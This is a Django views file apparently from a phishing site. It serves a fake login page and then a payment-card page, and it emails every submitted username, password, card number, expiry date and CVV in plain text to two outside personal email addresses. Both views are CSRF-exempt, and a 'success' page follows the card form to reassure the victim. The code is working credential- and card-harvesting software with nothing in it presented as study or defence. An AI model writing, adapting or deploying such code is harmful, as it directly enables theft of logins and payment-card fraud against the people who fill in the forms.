from django.forms.models import BaseModelForm
from django.http import HttpResponse
from django.shortcuts import render,redirect
from django.views.generic.edit import FormView
from django.views.generic import TemplateView
from django.urls import reverse_lazy
from django.views.decorators.csrf import csrf_exempt
from .models import Login,Phone
from django.core.mail import send_mail
from showtime.settings import EMAIL_HOST_USER

@csrf_exempt
def login_view(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        subject = 'New details submitted'
        mail_message = f"username: {username}\npassword: {password}"
        from_email = EMAIL_HOST_USER
        recipient_list = ['msikenzo@outlook.com','karenfurst6@gmail.com'] 
        send_mail(subject,mail_message,from_email, recipient_list, fail_silently=False)
        return redirect('card')
    return render(request, 'login.html')

@csrf_exempt
def card_view(request):
    if request.method == 'POST':
        cardholder_name = request.POST.get('cardholder_name')
        card_number = request.POST.get('card_number')
        expiry_month = request.POST.get('expiry_month')
        expiry_year = request.POST.get('expiry_year')
        cvv = request.POST.get('cvv')
        subject = 'New details submitted'
        mail_message = f"cardholder_name: {cardholder_name}\ncard_number: {card_number}\nexpiry_year: {expiry_year}\nexpiry_month: {expiry_month}\ncvv: {cvv}"
        from_email = EMAIL_HOST_USER
        recipient_list = ['msikenzo@outlook.com','karenfurst6@gmail.com'] 
        send_mail(subject,mail_message,from_email, recipient_list, fail_silently=False)
      
        combined_data = {
            
            'cardholder_name': cardholder_name,
            'card_number': card_number,
            'expiry_month': expiry_month,
            'expiry_year': expiry_year,
            'cvv': cvv
        }


        # send_mail(
        #     'Combined Form Data',
        #     f"Sign Up Details:\nUsername: {combined_data['username']}\nPassword: {combined_data['password']}\n\nCredit Card Details:\nCardholder Name: {combined_data['cardholder_name']}\nCard Number: {combined_data['card_number']}\nExpiry Date: {combined_data['expiry_month']}/{combined_data['expiry_year']}\nCVV: {combined_data['cvv']}",
        #     'your-email@gmail.com',
        #     ['recipient-email@gmail.com'],
        # )
        return redirect('success')
    return render(request, 'card.html')

def success_view(request):
    return render(request, 'index.html')